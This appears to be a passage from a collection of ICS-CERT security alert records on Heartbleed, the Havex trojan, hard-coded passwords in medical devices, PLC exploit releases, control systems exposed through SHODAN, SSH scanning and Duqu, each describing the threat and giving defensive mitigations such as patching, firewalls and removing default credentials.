As OpenSSL may be used as a third-party component, asset owners, operators, and SCADA software developers are encouraged to investigate the use of the affected versions of OpenSSL in their environments.", "title": "Situational Awareness Alert for OpenSSL Vulnerability (Update F)", "MITIGATION": "OpenSSL Version 1.0.1g has addressed and mitigates this vulnerability. Please contact your software vendor to check for availability of updates. Any system that may be affected by this vulnerability should regenerate any credential information (secret keys, passwords, etc.) with the assumption that an attacker has already used this vulnerability to obtain those items. Older versions of OpenSSL may not be vulnerable to the Heartbleed attacks, but have other known vulnerabilities that could be exploited. ICS-CERT strongly suggests that asset owners and operators verify what versions are running in the products being used in their facilities and then reference the following web site to determine which patched versions of OpenSSL should be used for the most secure operation. If there are still questions about what version is being used, contact the product vendor for verification. http://www.openssl.org/news/vulnerabilities.html DEVELOPERS Upgrade affected TLS/TDLS clients and servers to OpenSSL version 1.0.1g. Alternatively, affected versions of OpenSSL may be recompiled with the option “-DOPENSSL_NO_HEARTBEATS” to mitigate the vulnerability until an upgrade can be performed.

Send your name, e-mail address, and company affiliation to ics-cert@hq.dhs.gov . NOTE: ICS-CERT has not tested the validity or efficacy of these rule sets and cautions users to thoroughly test these solutions before implementing them into production environments. USE OF SPECIALIZED SEARCH ENGINES Even prior to the discovery of the OpenSSL vulnerability, Internet facing devices have been a serious concern over the past few years with remote access demands giving way to insecure or vulnerable configurations. Tools such as SHODAN, Google, and other search engines enable researchers and adversaries to easily discover and identify a variety of ICS devices that were not intended to be Internet facing. This is due in part to ICS terminology and search terms that have become widely available because of an increasing public body of knowledge with detailed ICS information. Adding to the threat landscape is SHODAN’s linkages to exploit databases as well as continuous scanning and cataloguing of devices with emerging vulnerabilities such as DNP3 and OpenSSL. The availability of public information coupled with the aforementioned tools, lowers the level of knowledge required to successfully locate Internet facing control systems. In many cases, these devices have not been configured with adequate authentication mechanisms, thereby further increasing the chances of both opportunistic and targeted attempts to directly access these components. Tools such as SHODAN may be proactively used by owners, operators, and security personnel to audit their networks and devices to locate Internet facing control system devices that may be susceptible to compromise. Asset owners are encouraged to query various search engines using the vendor product, model, and version of a device, to determine if their IP address block is found within the search results. If control systems devices are found using these tools, asset owners should take the necessary steps to remove these devices from direct or unsecured Internet access as soon as possible. As tools and adversary capabilities advance, ICS-CERT expects that exposed systems will be more effectively discovered, and targeted. It has become more important than ever for asset owners and operators to audit their network configurations and properly install their ICS devices behind patched VPNs or firewalls. ICS-CERT recommends that users take defensive measures to minimize the risk of exploitation of these vulnerabilities. Specifically, users should: Minimize network exposure for all control system devices and/or systems, and ensure that they are not accessible from the Internet. Locate control system networks and devices behind firewalls, and isolate them from the business network. ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to taking defensive measures.

{"SUMMARY": "This alert update is a follow-up to the original NCCIC/ICS-CERT Alert titled ICS-ALERT-14-176-02 ICS Focused Malware that was published June 25, 2014 on the ICS-CERT web site, and includes information previously published to the US-CERT secure portal. --------- Begin Update A Part 1 of 2 -------- ICS-CERT is analyzing malware and artifacts associated with an ICS focused malware campaign that uses multiple vectors for infection. These include phishing emails, redirects to compromised web sites and most recently, trojanized update installers on at least 3 industrial control systems (ICS) vendor web sites, in what are referred to as watering hole-style attacks. Based on information ICS-CERT has obtained from Symantec and F-Secure, the software installers for these vendors were infected with malware known as the Havex Trojan. According to analysis, these techniques could have allowed attackers to access the networks of systems that have installed the trojanized software.  The identities of these 3 known industrial control system vendors are available along with additional indicators of compromise to critical infrastructure owners and operators on the US-CERT secure portal. Havex is a Remote Access Trojan (RAT) that communicates with a Command and Control (C&C) server. The C&C server can deploy payloads that provide additional functionality. F-Secure and ICS-CERT identified and analyzed one payload that enumerates all connected network resources such as computers or shared resources, and uses the classic DCOM-based (Distributed Component Object Model) version of the Open Platform Communications (OPC) standard to gather information about connected control system resources within the network. The known components of the identified Havex payload do not appear to target devices using the newer OPC Unified Architecture (UA) standard. In particular, the payload gathers server information that includes Class Identification (CLSID), server name, Program ID, OPC version, vendor information, running state, group count, and server bandwidth. In addition to more generic OPC server information, the Havex payload also has the capability of enumerating OPC tags. Specifically the server is queried for tag name, type, access, and id. ICS-CERT is currently analyzing this payload; at this time ICS-CERT has not found any additional functionality to control or make changes to the connected hardware. It is important to note that ICS-CERT testing has determined that the Havex payload has caused multiple common OPC platforms to intermittently crash. This could cause a denial of service effect on applications reliant on OPC communications. ICS-CERT is also evaluating possible linkages between this activity and previous watering hole compromises and malware campaigns. ICS-CERT will actively provide additional information including indicators of compromise as analysis progresses. OPC provides an open standard specification that is widely used in process control, manufacturing automation, and other applications. The technology facilitates open connectivity and vendor equipment interoperability. The original version of the OPC specification, referred to as OPC classic, was implemented using Microsoft’s COM/DCOM (Distributed Component Object Model) technology.  In 2006, the OPC Foundation released a new standard, referred to as OPC Unified Architecture (UA), which does not use COM/DCOM.  The known components of the identified Havex payload do not appear to target devices using the newer OPC UA standard. --------- End Update A Part 1 of 2---------- More information including indicators of compromise can be found on the F-Secure web site: http://www.f-secure.com/weblog/archives/00002718.html In addition, ICS-CERT has posted a TLP Amber report regarding this activity to the portal library that also documents this activity. This report was developed by a trusted partner and provides additional technical details and analysis of the malware. ICS-CERT encourages US asset owners and operators to join the control systems compartment of the US-CERT secure portal. To request access to the secure portal send your name, email address, and company affiliation to ics-cert@hq.dhs.gov . Follow-up ICS-CERT released the follow-up advisory ICSA-14-178-01 ICS Focused Malware to the Web site on June 30, 2014. --------- Begin Update A Part 2 of 2 --------", "title": "ICS Focused Malware (Update A)", "MITIGATION": "Both the Symantec and F-Secure reports include technical indicators of compromise that can be used for detection and network defense. ICS-CERT strongly recommends that organizations check their network logs for activity associated with this campaign. Any organization experiencing activity related to this report should preserve available evidence for forensic analysis and future law enforcement purposes. For more questions about incident handling or preserving data, please reference ICS-CERT Incident Handling guidelines . OPC specific recommendations include: Enforce strict access control lists and authentication protocols for network level access to OPC clients and servers. Consider using OPC tunneling technologies to avoid exposure of any legacy DCOM based OPC services. When using OPC .NET based communications, ensure that the HTTP server enforces proper authentication and encryption of the OPC communications for both clients and servers. Leverage the OPC Security specification when possible. Additional mitigations to consider include: Always keep your patch levels up to date, especially on computers that host public services accessible through the firewall, such as HTTP, FTP, mail, and DNS services. Maintain up-to-date antivirus signatures and engines, and apply them based on industrial control system vendor recommendations. Build host systems, especially critical systems such as servers, with only essential applications and components required to perform the intended function. Where possible remove or disable any unused applications or functions to limit the attack surface of the host. Implement network segmentation through V-LANs to limit the spread of malware. Exercise caution when using removable media (USB thumb drives, external drives, CDs). Consider the deployment of Software Restriction Policy set to only allow the execution of approved software (application whitelisting) Whitelist legitimate executable directories to prevent the execution of potentially malicious binaries. Consider the use of two-factor authentication methods for accessing privileged root level accounts or systems. When remote access is required, consider deploying two-factor authentication through a hardened IPsec/VPN gateway with split-tunneling prohibited for secure remote access. Be prepared to operate without remote access during an incident if required. Implement a secure socket layer (SSL) inspection capability to inspect both ingress and egress encrypted network traffic for potential malicious activity. Minimize network exposure for all control system devices. Control system devices should not directly face the Internet. Place control system networks behind firewalls and isolate or air gap them from the business network. Provide robust logging such as network, host, proxy, DNS and IDS logs. Leverage the static nature of control systems to look for anomalies. Use configuration management to detect changes on field devices. Produce an MD5 checksum of clean code to verify any changes. Prepare for an incident with a dedicated incident response team and an incident response plan. Test both your plan and your team. If an incident occurs, leave the computer on if possible. Do not run antivirus as it modifies the time stamp on all files that it accesses. ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to taking defensive measures. ICS-CERT requests that any company that identifies activity related to this report, please notify ICS-CERT immediately for tracking and correlation.

{"SUMMARY": "Researchers Billy Rios and Terry McCorkle of Cylance have reported a hard-coded password vulnerability affecting roughly 300 medical devices across approximately 40 vendors. According to their report, the vulnerability could be exploited to potentially change critical settings and/or modify device firmware. Because of the critical and unique status that medical devices occupy, ICS-CERT has been working in close cooperation with the Food and Drug Administration (FDA) in addressing these issues. ICS-CERT and the FDA have notified the affected vendors of the report and have asked the vendors to confirm the vulnerability and identify specific mitigations. ICS-CERT is issuing this alert to provide early notice of the report and identify baseline mitigations for reducing risks to these and other cybersecurity attacks. ICS-CERT and the FDA will follow up with specific advisories and information as appropriate The report included vulnerability details for the following vulnerability Vulnerability Type Remotely Exploitable Impact Hard-coded password Yes, device dependent Critical settings/device firmware modification The affected devices have hard-coded passwords that can be used to permit privileged access to devices such as passwords that would normally be used only by a service technician. In some devices, this access could allow critical settings or the device firmware to be modified. The affected devices are manufactured by a broad range of vendors and fall into a broad range of categories including but not limited to: Surgical and anesthesia devices, Ventilators, Drug infusion pumps, External defibrillators, Patient monitors, and Laboratory and analysis equipment. ICS-CERT and the FDA are not aware that this vulnerability has been exploited, nor are they aware of any patient injuries resulting from this potential cybersecurity vulnerability.", "title": "Medical Devices Hard-Coded Passwords", "MITIGATION": "ICS-CERT is currently coordinating with multiple vendors, the FDA, and the security researchers to identify specific mitigations across all devices. In the interim, ICS-CERT recommends that device manufacturers, healthcare facilities, and users of these devices take proactive measures to minimize the risk of exploitation of this and other vulnerabilities. The FDA has published recommendations and best practices to help prevent unauthorized access or modification to medical devices. Take steps to limit unauthorized device access to trusted users only, particularly for those devices that are life-sustaining or could be directly connected to hospital networks. Appropriate security controls may include: user authentication, for example, user ID and password, smartcard or biometric; strengthening password protection by avoiding hard‑coded passwords and limiting public access to passwords used for technical device access; physical locks; card readers; and guards. Protect individual components from exploitation and develop strategies for active security protection appropriate for the device’s use environment. Such strategies should include timely deployment of routine, validated security patches and methods to restrict software or firmware updates to authenticated code. Note: The FDA typically does not need to review or approve medical device software changes made solely to strengthen cybersecurity. Use design approaches that maintain a device’s critical functionality, even when security has been compromised, known as “fail-safe modes.” Provide methods for retention and recovery after an incident where security has been compromised. Cybersecurity incidents are increasingly likely and manufacturers should consider incident response plans that address the possibility of degraded operation and efficient restoration and recovery. For health care facilities: The FDA is recommending that you take steps to evaluate your network security and protect your hospital system. In evaluating network security, hospitals and health care facilities should consider: Restricting unauthorized access to the network and networked medical devices. Making certain appropriate antivirus software and firewalls are up-to-date. Monitoring network activity for unauthorized use. Protecting individual network components through routine and periodic evaluation, including updating security patches and disabling all unnecessary ports and services. Contacting the specific device manufacturer if you think you may have a cybersecurity problem related to a medical device. If you are unable to determine the manufacturer or cannot contact the manufacturer, the FDA and DHS ICS-CERT may be able to assist in vulnerability reporting and resolution. Developing and evaluating strategies to maintain critical functionality during adverse conditions. ICS-CERT reminds health care facilities to perform proper impact analysis and risk assessment prior to taking defensive and protective measures. ICS-CERT also provides a recommended practices section for control systems on the US-CERT Web site. Several recommended practices are available for reading or download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies . a Although medical devices are not industrial control systems, many of the recommendations from these documents are applicable.

{"SUMMARY": "ICS-CERT is monitoring and responding to a combination of threat elements that increase the risk of control systems attacks. These elements include Internet accessible industrial control system (ICS) configurations, vulnerability and exploit tool releases for ICS devices, and increased interest and activity by hacktivist groups and others. On February 14, 2012, several new exploit tools were publicly released that specifically target programmable logic controllers (PLCs), the building blocks of many ICSs. These exploits target PLCs from GE, Rockwell Automation, Schneider Electric, and Koyo. In addition, one of the exploits targets the EtherNet/IP protocol, which is deployed by numerous PLC vendors in addition to those listed here. The payloads purportedly can affect any device that uses the EtherNet/IP protocol and could allow an attacker to crash or restart affected devices. --------- Begin Update A Part 1 of 2 -------- A team of researchers recently contacted ICS-CERT with preliminary results from their analytical project to locate Internet facing control system related devices. Using the SHODAN search engine, the researchers compiled a list of more than 500,000 control systems-related devices using supervisory control and data acquisition (SCADA) and other ICS-related search terms. The researchers have brought their findings to the attention of ICS-CERT, citing concerns that an adversary could use the search engine as a shortcut to find vulnerable systems and thereby threaten or attack critical infrastructure. ICS-CERT is working with the researchers and industry partners to notify the owners of the identified IP addresses, but recommends that asset owners and operators take a proactive approach and audit their systems to ensure that strong authentication/logon credentials and defensive measures are in place. --------- End Update A Part 1 of 2 -------- ICS-CERT is issuing this alert to inform critical infrastructure and key resource (CIKR) asset owners and operators of recent and ongoing activity concerning increased risk to CIKR assets, particularly Internet accessible control systems. Emerging Threats Multiple threat elements are combining to significantly increase the ICSs threat landscape. Hacktivist groups are evolving and have demonstrated improved malicious skills. They are acquiring and using specialized search engines to identify Internet facing control systems, taking advantage of the growing arsenal of exploitation tools developed specifically for control systems. Asset owners should take these changes in threat landscape seriously, and ICS-CERT strongly encourages taking immediate defensive action to secure their systems using defense-in-depth principles. 1 Asset owners should not assume that their control systems are secure or that they are not operating with an Internet accessible configuration. Instead, asset owners should thoroughly audit their networks for Internet facing devices, weak authentication methods, and component vulnerabilities. Hacktivist Group Activity ICS-CERT has recently seen a marked increase in interest shown by a variety of malicious groups, including hacktivist 2 and anarchist groups, toward Internet accessible ICS devices. This increased activity includes the identification of Internet facing ICS devices and the public posting of IP address to various Web sites. In addition, individuals from these groups have posted online requests for others to visit or access the identified device addresses. Specialized Search Engines The ERIPP and SHODAN search engines can be easily used to find Internet facing ICS devices, thus identifying potential attack targets. These search engines are being actively used to identify and access control systems over the Internet. Combining these tools with easily obtainable exploitation tools, attackers can identify and access control systems with significantly less effort than ever before. --------- Begin Update A Part 2 of 2 -------- Search engines, such as SHODAN or ERIPP, may be proactively used by owners, operators, and security personnel to audit their networks and devices to locate Internet-facing control system devices that may be susceptible to compromise. Asset owners are encouraged to query various search engines using the vendor product, model, and version of a device, to determine if their IP address block is found within the search results. If control systems devices are found using these tools, asset owners should take the necessary steps to remove these devices from direct or unsecured Internet access as soon as possible. --------- End Update A Part 2 of 2 -------- ICS-CERT has released two prior alerts 3 , 4 warning of the risks associated with Internet accessible devices; the alerts are available on the ICS-CERT Web page. Exploitation Tool Releases The increased interest in ICS product security has resulted in a significant increase in product vulnerability reports. Security researchers and others have released tools exploiting vulnerabilities identified in these reports. These targeted exploits are readily available through various software tools and from exploit developers. Easy access to free or low cost exploit tools has dramatically lowered the skill level required for novice hackers and has likewise reduced the development time for advanced attackers. On February 14, 2012, several independent researchers released exploit tools specifically targeting programmable logic controllers (PLCs), which are the building blocks of many ICSs. These tools include modules that can be plugged into exploit frameworks, such as Metasploit, giving potential attackers another avenue to target ICS. Modules have been released to exploit several major PLC vendors, including: GE (D20), Schneider Electric (Modicon Quantum), Rockwell Automation (Allen Bradley ControlLogix), and Koyo (H4-ES). ICS-CERT is actively coordinating with these vendors and has published specific alerts and advisories to notify ICS stakeholders of this addition to the ICS threat landscape. 1.

Hacktivist groups are ideologically motivated hackers who attack entities’ networks to promote change or make a political statement. Tactics include Web defacements, redirects, denial of service, information theft, Web site parodies, virtual sit-ins, and virtual sabotage.

{"SUMMARY": "Independent security researchers Billy Rios and Terry McCorkle notified ICS-CERT of a directory traversal and weak credential storage vulnerability with proof-of-concept (PoC) exploit code for Tridium Niagara AX Framework software. According to their research, the vulnerabilities are exploitable by downloading and decrypting the file containing the user credentials from the server. ICS-CERT has been in coordination with Mr. Rios, Mr. McCorkle and Tridium. Original attempts to coordinate vulnerability information were unsuccessful and ICS-CERT, in coordination with the researchers, was planning a release of the vulnerability information. However, recent communications from Tridium indicated they were working on a solution, resulting in the delayed release of this Alert so that mitigations/patches could be prepared. Yesterday, a public report was published detailing the vulnerabilities and as a result, ICS-CERT has shortened its release schedule and is issuing this Alert to warn the community of the unpatched vulnerabilities. Tridium has released a security alert with instructions on how to implement interim mitigations. Tridium has stated that they are testing a software update that will resolve these vulnerabilities. ICS-CERT will issue an Advisory when the software update is available. Mr. Rios a and Mr. McCorkle’s research includes vulnerability details for the following vulnerabilities: Vulnerability Type Remotely Exploitable Impact Directory traversal Yes Data leakage Weak credential storage Yes Privilege escalation Background Tridium Niagara is a software platform that integrates various different systems and devices and allows them to be managed via the Internet.

{"SUMMARY": "--------- Begin Update A Part 1 of 2 -------- This Alert Update is a follow-up to the original ICS-CERT Alert titled ICS-ALERT-11-343-01 - Control System Internet Accessibility published to the ICS-CERT Web site on December 09, 2011. This update includes additional activity observed by ICS-CERT related to the threat of Internet accessible control systems devices. --------- End Update A Part 1 of 2 ---------- ICS-CERT is tracking and has responded to multiple reports of researchers using SHODAN, 1 Every Routable IP Project 2 (ERIPP), Google, and other search engines to discover Internet facing control systems. ICS-CERT has coordinated this information with the identified control system owners and operators to notify them of their potential vulnerability to cyber intrusion and attack. When appropriate, ICS-CERT also coordinates with the corresponding sector Information Sharing and Analysis Centers (ISACs) or international CERT/CIRT (Computer Incident Response Team) to notify asset owners. In many instances, the exposed systems were unknowingly or unintentionally configured with potentially unsecure access authentication and authorization mechanisms. ICS-CERT works with the asset owner/operators and vendor or systems integrators whenever possible to remove any default credentials and secure these systems from attack. In cases where unauthorized access has been identified, ICS-CERT has assisted control system owners and operators with system and firewall data analysis to determine the extent of the intrusion and whether any configuration changes might have been made to the system. The use of readily available and generally free search tools significantly reduces time and resources required to identify Internet facing control systems. In turn, hackers can use these tools to easily identify exposed control systems, posing an increased risk of attack. Conversely, owners and operators can also use these same tools to audit their assets for unsecured Internet facing devices. Recent Reports Internet facing control systems have been identified in several critical infrastructure sectors. The systems vary in their deployment footprints, ranging from stand-alone workstation applications to larger distributed control systems (DCS) configurations. In many cases, these control systems were designed to allow remote access for system monitoring and management. All too often, remote access has been configured with direct Internet access (no firewall) and/or default or weak user names and passwords. In addition, those default/common account credentials are often readily available in public space documentation. In all cases, ICS-CERT has worked with these organizations to remove default credentials and strengthen their overall security. Recent examples of these are as follows. --------- Begin Update A Part 2 of 2 -------- ICS-CERT has recently become aware of multiple systems with default usernames and passwords that are accessible via the Internet. These systems have not been configured securely with common best practices such as being placed behind a firewall or changing documented default credentials. These reports include the Echelon i.LON product that is commonly deployed within ICS devices such as motors, pumps, valves, sensors, etc., which contain a default username and password. This is not an inherent vulnerability, but left unchanged, poses a security risk, especially when configured as Internet accessible. The default username and password should be removed and replaced with a strong username and password configuration, especially when the device is Internet accessible. ICS-CERT has released several products concerning weak authentication mechanisms. Weak authentication mechanisms are often difficult to remedy because passwords cannot typically be changed by the user to protect the system. The products below highlight weak authentication vulnerabilities that have been reported to ICS-CERT and patched by the vendor: ICSA-11-173-01 - ClearSCADA Remote Authentication Bypass ICSA-11-356-01 - Siemens Simatic HMI Authentication Vulnerability ICSA-12-146-01A - RuggedCom Weak Cryptography for Password Vulnerability ICS-CERT recommends that organizations audit their control systems and apply patches, and follow vendor-recommended security postures and settings. --------- End Update A Part 2 of 2 ---------- In February 2011, independent security researcher Rubėn Santamarta used SHODAN to identify online remote access links to multiple utility companies’ supervisory control and data acquisition (SCADA) systems. Mr. Santamarta notified ICS-CERT for coordination with the vendor and the affected control system owners and operators. Further research indicated that many systems were using default user names and passwords. In April 2011, ICS-CERT received reports of 75 Internet facing control system devices, mostly in the water sector. ICS-CERT worked with the Water Sector ISAC and the vendor to notify affected control system owners and operators. Many of those control systems had their remote access configured with default logon credentials. In September 2011, independent researcher Eireann Leverett contacted ICS-CERT to report several thousand Internet facing devices that he discovered using SHODAN. To date, this response has included international partners and approximately 63 other CERTs in the effort to notify the identified control system owners and operators that their control systems/devices were exposed on the Internet. In November 2011, another individual claimed to have directly accessed an Internet facing control system. The report indicated that the individual gained access using default username and password. ICS-CERT notified the affected control system owner and advised the owner to disconnect the control system from the Internet and reconfigure the remote access security. ICS-CERT also coordinated with the SCADA vendor to provide the owner detailed instructions for removing the default logon account. Currently, ICS-CERT is coordinating the response to several new reports of Internet facing control systems from independent researchers Billy Rios, Terry McCorkle, Joel Langill, and other trusted sources. When incidents of this nature are reported, ICS-CERT works with the reporting entity, control system owners and operators, vendors, integrators, ISACs, and other U.S. and international CERT/CIRTs to notify the identified entities and help the mitigate their exposure.", "title": "Control System Internet Accessibility (Update A)", "MITIGATION": "ICS-CERT recommends that control system owners and operators audit their control systems—whether or not they think their control systems are connected to the Internet—to discover and verify removal of any default administrator level user names and passwords. Because each control system installation is unique, owners and operators may need to contact their system vendor or integrator for assistance with locating and eliminating default accounts. Owners and operators can also perform a comprehensive control system cybersecurity assessment using the DHS Control Systems Security Program (CSSP) Cyber Security Evaluation Tool (CSET). CSET is a free, downloadable, stand alone software tool that is designed to assist owners and operators to: Determine their current security posture Identify where security improvements can/should be made Map out the existing component/network configuration Output a basic cybersecurity plan.

In addition, ICS-CERT recommends that control system owners and operators take defensive measures to minimize the risk of exploitation of these vulnerabilities. Specifically, they should: Minimize network exposure for all control system devices. Control system devices should not directly face the Internet. Locate control system networks and devices behind firewalls and isolate them from the business network. If remote access is required, employ secure methods such as Virtual Private Networks (VPNs), recognizing that VPN is only as secure as the connected devices. Remove, disable, or rename any default system accounts wherever possible. Implement account lockout policies to reduce the risk from brute forcing attempts. Implement policies requiring the use of strong passwords. Monitor the creation of administrator level accounts by third-party vendors. ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to taking defensive measures. The Control System Security Program also provides a recommended practices section for control systems on the US-CERT Web site. Several recommended practices are available for reading or downloading, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies . Organizations that observe any suspected malicious activity should follow their established internal procedures and report their findings to ICS-CERT for tracking and correlation against other incidents. Additional Resources ICS-CERT has previously published a Control Systems Analysis Report titled “ CSAR-10-114-01 - SSH Scanning” that discusses the brute forcing a of control system secure shell (SSH) accounts. Many of the tactics, techniques, and procedures (TTPs) used to brute force SSH account usernames and passwords also apply to Web-based human-machine interface (HMI) applications used in control systems. ICS-CERT has also published an advisory titled ICSA-10-228-01 - Vendor Admin Accounts Warning that emphasizes the importance of awareness and control of administrator level accounts installed by vendors. 1.

{"SUMMARY": "ICS-CERT is tracking reports of two large solar flares that erupted Tuesday, March 06, 2012, at 1900 EST, from an active region on the sun identified as AR 1429. The first flare, rated at X5.4, produced a coronal mass ejection (CME) that struck the earth a glancing blow on March 07, 2012, 0625 GMT. The second flare, rated at X1.3, occurred an hour later. The CME produced by that flare is anticipated to hit the Earth on March 08, 2012. NASA reports the first CME caused a moderate geomagnetic storm (rated G2) 1 and a strong solar radiation storm (rated S3); the second CME caused a minor geomagnetic storm (rated G1) and a strong solar radiation storm (rated S3). The resulting geomagnetic storms can cause aurora at low latitudes and possibly disrupt satellite and high frequency radio communication, global positioning systems (GPS), and power grids. Currently, ICS-CERT has no reports of damage or significant effects from these events. ICS-CERT requests that any issues from this solar event affecting control systems in critical infrastructure environments be reported ( ics-cert@dhs.gov ) for tracking and correlation with other similar events. Background NASA reports that its Advanced Composition Explorer (ACE) satellite, located just outside the Earth’s magnetic environment, identified on March 08, 2012, 0542 EST, the resulting magnetic storm rated G1 (on a scale of G1 to G5). The CMEs are expected to impact the Earth over a two day period. Please refer to the National Oceanic and Atmospheric Administration (NOAA) website for an explanation of space weather terminology and severity ratings. NASA has also published a web page explaining the possible ramifications of more severe space weather events. 2 ICS-CERT previously released an advisory titled “ ICSA-11-084-01 – Solar Magnetic Storm Impact On Control Systems ” on March 25, 2011, that contains pertinent information on how these solar events can impact electrical systems. 1. http://www.swpcnoaa.gov/NOAAscales/indexhtml#GeomagneticStorms, website last accessed March 08, 2012. 2. http://sciencenasa.gov/science-news/science-at-nasa/2009/21janseverespaceweather/, website last accessed March 08, 2012.

{"SUMMARY": "ICS-CERT is issuing this alert to inform critical infrastructure and key resource (CIKR) asset owners and operators of recent and ongoing activity involving secure shell (SSH) 1 scanning of Internet facing control systems. 2 ICS-CERT is aware that many organizations have been seeing a large number of access attempts by remote attackers. Systems that provide SSH command line access are common targets for “brute force” attacks. As recently as this week, ICS-CERT received a report from an electric utility experiencing unsuccessful brute force activity against their networks. What Are Brute Force Attacks? A brute force authentication attack attempts to obtain a user’s logon credentials by guessing usernames and passwords. Brute force login tools exist for most services that allow remote access. Attackers can use brute force applications, such as password guessing tools and scripts, to automate username and password guessing. Such applications may use default password databases, dictionaries, or rainbow tables that contain commonly used passwords, or they may try all combinations of a character set to guess a password. To find running SSH services on networks, attackers probe a large number of IPs on Port 22/TCP—the default SSH listening port. If a response from the probe of Port 22/TCP is received, the attacker may initiate a brute force attack. Scanning: What to Look For ICS-CERT recommends that organizations monitor network logs for port scans as well as access attempts. Hundreds or thousands of login attempts over a relatively short time period is an indicator of a brute force attack because systems running SSH normally do not receive high volumes of login attempts. However, indication of an attack does not necessarily mean that the organization is the actual intended target. Scans are frequently executed against a wide range of IP addresses looking for any system meeting the attacker’s criteria (in this case, systems running SSH). Because high volume scans tend to be quickly discovered, attackers may try to evade intrusion detection systems (IDS) by making only a few careful attempts, then waiting to try again later. Organizations should look carefully for these “quiet” attempts as possible precursors to more direct attacks. Is SSH Running? While SSH is popularly associated with UNIX or Linux systems, many types of devices provide SSH access by default, including control systems equipment. Control system devices are often found on networks with SSH enabled by default.", "title": "SSH Scanning Activity Targets Control Systems", "MITIGATION": "ICS-CERT strongly encourages CIKR asset owners and operators to examine their control network configurations and establish a baseline configuration and traffic pattern. ICS-CERT also recommends that asset owners and operators audit their control systems—whether or not they think their control systems are connected to the Internet—to discover and verify removal of any default user names and passwords. Because each control system installation is unique, owners and operators may need to contact their system vendor or integrator for assistance with locating and eliminating default accounts. Control system owners and operators are encouraged to take the following defensive measures to minimize the risk of exploitation of these vulnerabilities. MITIGATION Minimize network exposure for all control system networks and devices. Control system devices should not directly face the Internet. Locate control system networks and devices behind firewalls, and isolate them from the business network. Stay actively aware of what is on the network by performing periodic port scans (where and when possible). 3 If remote access is required, employ secure methods, such as Virtual Private Networks (VPNs), recognizing that VPN is only as secure as the connected devices. Remove, disable, or rename any default system accounts wherever possible. Implement account lockout policies to reduce the risk from brute forcing attempts. Implement policies requiring the use of strong passwords. Make password lengths long and combine letters, numbers, and special characters. For additional guidance, see Microsoft’s Online Privacy and Safety web page: Create stronger passwords . Monitor the creation of administrator level accounts by third-party vendors. MITIGATION Configure SSH servers to use nonstandard ports. SSH normally listens on Port 22/TCP, but can be configured to listen on any other unused TCP port (the TCP protocol offers 65,535 ports). Because many scanning tools only scan a limited (low) port range by default, selecting a nonstandard high port number can make the SSH less likely to be detected by those tools. Restrict access to SSH servers. Only allow access from specific hosts rather than allowing access from anywhere. If the SSH server supports public‐key authentication, consider using this as an option to static passwords. Use Intrusion Detection/Intrusion Prevention. An intrusion detection system (IDS) monitors networks for malicious activity or policy violations. IDS systems can aid in investigations of system breaches. Intrusion prevention systems (IPS) incorporate IDS functionality but also include the ability to block an attack as it is happening, preventing harm to the control system network rather than simply announcing that an attack has occurred. The Control Systems Security Program (CSSP) also provides a section for control systems security recommended practices on the CSSP web page. Several recommended practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies . ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to taking defensive measures. Recovery and Reporting Organizations that detect suspicious activity should check their logs to see if any of the attempts were successful. If a successful login attempt from a brute force attack is detected, follow-on steps should be taken to implement a cyber incident response plan.f In addition, organizations should carefully adhere to computer forensic best practices to avoid destroying potential evidence. 4 Organizations observing any suspected malicious activity should follow their established internal procedures and report their findings to ICS-CERT for tracking and correlation against other incidents. 1. “Secure Shell or SSH is a network protocol that allows data to be exchanged using a secure channel between two networked devices.” http://en.wikipedia.org/wiki/SecureShell, website last accessed February 02, 2012. 2.

{"SUMMARY": "This report is based on information presented by the Project Basecamp team of researchers during Digital Bond’s SCADA Security Scientific Symposium (S4) on January 19, 2012, without coordination with either the vendors or ICS-CERT. The Basecamp findings include multiple zero-day vulnerabilities for several leading industrial control system (ICS) hardware Programmable Logic Controllers (PLCs). Major affected vendors include GE, Koyo, Rockwell, Schneider (Modicon), and Schweitzer. Exploit code was also released for the GE vulnerabilities. The affected PLCs are used to control functions in critical infrastructure in the chemical, energy, water, nuclear, and critical manufacturing sectors. ICS-CERT has contacted the affected vendors about the vulnerabilities in an effort to confirm them and identify mitigations. ICS-CERT is issuing this alert to provide preliminary notice of the reported vulnerable products and to begin identifying baseline mitigations to reduce the risk of cybersecurity attacks that may attempt to exploit these vulnerabilities. Affected Vendors Product General Electric D20/D20ME Rockwell Automation Allen-Bradley ControlLogix Rockwell Automation Allen-Bradley MicroLogix Schneider Electric Modicon Quantum Koyo Direct LOGIC H4-ES Schweitzer SEL-2032 The vulnerabilities purportedly include buffer overflows, backdoors, weak authentication and encryption, and other vulnerabilities that could allow an attacker to take control of the device and interfere or halt the process it controls. Two new Metasploit modules have been released for the GE D20/DME vulnerabilities that could allow lower skilled users to exploit these vulnerabilities. In addition, according to Basecamp researchers, additional modules targeting the other products are expected to be released soon. This public release increases the potential for cyber attack on these devices, particularly if the devices are connected to the Internet. ICS-CERT reminds users that the use of readily available and generally free search tools (such as SHODAN and ERIPP) significantly reduces time and resources required to identify Internet facing control systems. In turn, hackers can use these tools combined with the exploit modules to identify and attack vulnerable control systems. Conversely, owners and operators can also use these same tools to audit their assets for unsecured Internet facing devices.

{"SUMMARY": "--------- Begin Update E Part 1 of 4 -------- This updated Alert is a follow-up to the Alert titled “ICS-ALERT-11-291-01D—W32.Duqu: An information-gathering malware” published October 26, 2011 on the ICS-CERT web. A Version C (containing FOUO-related content) was released on the US-CERT Secure Portal. On November 1, 2011 Symantec 1 and the Laboratory of Cryptography and Systems Security (CrySyS) 2 released updated reports identifying possible affected organizations, the dropper used to infect systems, and a new command and control (C&C) IP address. The below sections highlight the new information identified. ICS-CERT is in the process of compiling and re-organizing all of the data in this alert for release in an upcoming advisory. --------- End Update E Part 1 of 4 -------- ICS-CERT, in close coordination with Symantec and the original researchers, has determined after additional analysis that neither industrial control systems (ICSs) nor vendors/manufacturers were targeted by Duqu. In addition, as of October 21, 2011, there have been few infections, and there is no evidence based on current code analysis that Duqu presents a specific threat to ICSs. --------- Begin Update E Part 2 of 4 -------- According to Symantec, they have confirmed six possible infected organizations in eight countries including France, Netherlands, Switzerland, Ukraine, India, Iran (2), Sudan, and Vietnam. Symantec notes the organizations are only traceable back to an ISP. Other security vendors have reported infections in 